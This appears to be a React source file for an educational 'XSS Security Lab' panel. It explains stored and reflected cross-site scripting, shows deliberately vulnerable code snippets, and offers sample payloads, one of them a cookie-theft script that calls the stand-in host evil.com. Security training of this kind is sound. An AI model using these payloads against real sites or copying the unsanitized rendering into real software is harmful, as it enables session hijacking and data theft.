/**
 * XSS Security Lab — inline on the My Opportunities page (notes section).
 * Collapsed by default; expands to show education + try-it-yourself.
 */
import { useState, useRef, useEffect, useCallback } from "react";
import { fetchAuthSession } from "aws-amplify/auth";
import {
  Box, Button, ColumnLayout, ExpandableSection,
  Input, SpaceBetween, Spinner, StatusIndicator, Alert, Textarea,
} from "@cloudscape-design/components";

const API = import.meta.env.VITE_REST_API_URL?.replace(/\/$/, "") ?? "";

const PAYLOADS = [
  { label: "Script alert", value: '<script>alert("XSS")</script>' },
  { label: "Image onerror", value: '<img src=x onerror=alert("XSS")>' },
  { label: "SVG onload", value: '<svg onload=alert("XSS")>' },
  { label: "Cookie theft", value: '<script>fetch("https://evil.com?c="+document.cookie)</script>' },
];

const XSSLab = () => {
  const [comment, setComment] = useState("");
  const [searchQ, setSearchQ] = useState("");
  const [comments, setComments] = useState<any[]>([]);
  const [postRes, setPostRes] = useState<any>(null);
  const [searchRes, setSearchRes] = useState<any>(null);
  const [busy, setBusy] = useState(false);
  const [searchBusy, setSearchBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  const ref = useRef<HTMLDivElement>(null);

  const getToken = async () => {
    const s = await fetchAuthSession();
    return s.tokens?.idToken?.toString() ?? "";
  };

  const loadComments = useCallback(async () => {
    try {
      const token = await getToken();
      const r = await fetch(`${API}/security-comments`, { headers: { Authorization: token } });
      const d = await r.json();
      if (d.success) setComments(d.data || []);
    } catch { /* ignore */ }
  }, []);

  useEffect(() => { loadComments(); }, [loadComments]);

  const postComment = async () => {
    if (!comment.trim()) return;
    setBusy(true); setPostRes(null); setErr(null);
    try {
      const token = await getToken();
      const r = await fetch(`${API}/security-comments`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: token },
        body: JSON.stringify({ user_id: 1, content: comment }),
      });
      const d = await r.json();
      setPostRes(d);
      if (d.success) { setComment(""); await loadComments(); }
    } catch (e: any) { setErr(e?.message || "Request failed"); }
    finally { setBusy(false); }
  };

  const searchComments = async () => {
    if (!searchQ.trim()) return;
    setSearchBusy(true); setSearchRes(null);
    try {
      const token = await getToken();
      const r = await fetch(`${API}/security-search?q=${encodeURIComponent(searchQ)}`, { headers: { Authorization: token } });
      setSearchRes(await r.json());
    } catch (e: any) { setErr(e?.message || "Search failed"); }
    finally { setSearchBusy(false); }
  };

  return (
    <div style={{ border: "1px solid #fde68a", borderLeft: "3px solid #f59e0b", borderRadius: 8, background: "#fffbeb", overflow: "hidden" }}>
      <ExpandableSection variant="footer" headerText={
        <span style={{ display: "inline-flex", alignItems: "center", gap: 10 }}>
          <span style={{ fontSize: 17, color: "#1e293b", fontWeight: 600 }}>⚡ Security Lab: Cross-Site Scripting (XSS)</span>
          <span style={{ display: "inline-flex", alignItems: "center", fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 4, background: "#fffbeb", color: "#d97706", border: "1px solid #fde68a", lineHeight: "16px" }}>HIGH</span>
        </span>
      }>
        <div style={{ padding: "16px 20px 20px", color: "#1f2937" }}>
          <SpaceBetween size="l">
            {/* Education */}
            <ColumnLayout columns={2}>
              <div>
                <span style={{ fontWeight: 600, color: "#111827", fontSize: 14 }}>What is Cross-Site Scripting?</span>
                <p style={{ margin: "8px 0 0", color: "#374151", lineHeight: 1.6, fontSize: 13 }}>
                  XSS allows attackers to inject malicious scripts into web pages viewed by other users.
                  When user input is stored or reflected without sanitization, the browser executes the
                  attacker's code in the context of the victim's session.
                </p>
              </div>
              <div>
                <span style={{ fontWeight: 600, color: "#111827", fontSize: 14 }}>Why is it dangerous?</span>
                <ul style={{ margin: "8px 0 0", paddingLeft: 18, color: "#374151", lineHeight: 1.8, fontSize: 13 }}>
                  <li>Session hijacking via cookie theft</li>
                  <li>Credential harvesting with fake forms</li>
                  <li>Defacement of the application UI</li>
                  <li>Worm-like propagation across users</li>
                </ul>
              </div>
            </ColumnLayout>

            {/* Vulnerable code */}
            <div>
              <span style={{ fontWeight: 600, color: "#111827", fontSize: 13 }}>⚠️ Vulnerable Code</span>
              <pre style={{ background: "#1e293b", color: "#e2e8f0", padding: "12px 16px", borderRadius: 6, fontSize: 12, lineHeight: 1.6, overflowX: "auto", marginTop: 8 }}>
{`<!-- Stored XSS: note rendered without encoding -->
<div dangerouslySetInnerHTML={{ __html: note.text }} />

# Reflected XSS: search query echoed in response
return {"message": f"You searched for: {query}"}`}
              </pre>
            </div>

            {/* Try it yourself — Post comment */}
            <div style={{ background: "#f9fafb", border: "1px solid #e5e7eb", borderRadius: 8, padding: 16 }}>
              <SpaceBetween size="m">
                <span style={{ fontWeight: 600, color: "#111827", fontSize: 14 }}>🧪 Try It Yourself — Stored XSS</span>
                <p style={{ margin: 0, color: "#4b5563", fontSize: 13 }}>Post a comment with an XSS payload. It will be stored and rendered without sanitization.</p>
                <Textarea value={comment} onChange={({ detail }) => setComment(detail.value)} placeholder="Enter a comment or XSS payload..." rows={2} />
                <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                  <Button variant="primary" onClick={postComment} loading={busy}>Post Comment</Button>
                </div>
                <div>
                  <span style={{ fontSize: 12, color: "#6b7280", fontWeight: 500 }}>Sample payloads:</span>
                  <div style={{ display: "flex", flexWrap: "wrap", gap: 6, marginTop: 6 }}>
                    {PAYLOADS.map((p) => (
                      <button key={p.label} onClick={() => setComment(p.value)}
                        style={{ background: "#f3f4f6", border: "1px solid #d1d5db", borderRadius: 6, padding: "4px 10px", fontSize: 12, color: "#1e40af", cursor: "pointer", fontFamily: "monospace" }}
                        onMouseEnter={(e) => (e.currentTarget.style.background = "#e5e7eb")}
                        onMouseLeave={(e) => (e.currentTarget.style.background = "#f3f4f6")}
                        title={p.label}>{p.label}</button>
                    ))}
                  </div>
                </div>
                {postRes && (
                  <Alert type={postRes.success ? (postRes.educational ? "warning" : "success") : "error"} header={postRes.message || (postRes.success ? "Comment posted" : "Error")}>
                    {postRes.educational?.what_happened}
                  </Alert>
                )}
              </SpaceBetween>
            </div>

            {/* Try it yourself — Search (Reflected XSS) */}
            <div style={{ background: "#f9fafb", border: "1px solid #e5e7eb", borderRadius: 8, padding: 16 }}>
              <SpaceBetween size="m">
                <span style={{ fontWeight: 600, color: "#111827", fontSize: 14 }}>🔍 Try It Yourself — Reflected XSS</span>
                <p style={{ margin: 0, color: "#4b5563", fontSize: 13 }}>Search comments — the query is reflected in the response without encoding.</p>
                <div style={{ display: "flex", gap: 8, alignItems: "flex-start" }}>
                  <div style={{ flex: 1 }}>
                    <Input value={searchQ} onChange={({ detail }) => setSearchQ(detail.value)} placeholder='Search comments (try: <script>alert("XSS")</script>)' onKeyDown={({ detail }) => { if (detail.key === "Enter") searchComments(); }} />
                  </div>
                  <Button variant="primary" onClick={searchComments} loading={searchBusy}>Search</Button>
                </div>
                {searchRes && (
                  <Alert type={searchRes.educational ? "warning" : "info"} header={searchRes.message || "Search results"}>
                    {searchRes.educational?.what_happened}
                    {searchRes.data && <Box variant="small" color="text-body-secondary">{searchRes.data.length} result(s) found</Box>}
                  </Alert>
                )}
              </SpaceBetween>
            </div>

            {/* Recent comments */}
            <div ref={ref}>
              {comments.length > 0 && (
                <div style={{ background: "#fff", border: "1px solid #e5e7eb", borderRadius: 8, overflow: "hidden" }}>
                  <div style={{ padding: "10px 12px", borderBottom: "1px solid #e5e7eb" }}>
                    <span style={{ fontWeight: 600, color: "#111827", fontSize: 13 }}>Recent Comments ({comments.length})</span>
                  </div>
                  <div style={{ maxHeight: 200, overflowY: "auto" }}>
                    {comments.slice(0, 10).map((c: any) => (
                      <div key={c.id ?? c.created_at} style={{ padding: "8px 12px", borderBottom: "1px solid #f3f4f6", fontSize: 13 }}>
                        <span style={{ color: "#6b7280", fontSize: 11 }}>{c.username || `User ${c.user_id}`} — {c.created_at}</span>
                        <div style={{ color: "#374151", marginTop: 2 }}>{c.content}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {err && <Alert type="error">{err}</Alert>}

            {/* Educational alert */}
            {postRes?.educational && (
              <Alert type="info" header={`🚨 ${postRes.educational.vulnerability}`}>
                <SpaceBetween size="s">
                  <Box><Box variant="strong">What Happened:</Box> {postRes.educational.what_happened}</Box>
                  <Box><Box variant="strong">How AWS Security Agent Detects This:</Box> {postRes.educational.how_agent_detects}</Box>
                </SpaceBetween>
              </Alert>
            )}
          </SpaceBetween>
        </div>
      </ExpandableSection>
    </div>
  );
};

export default XSSLab;
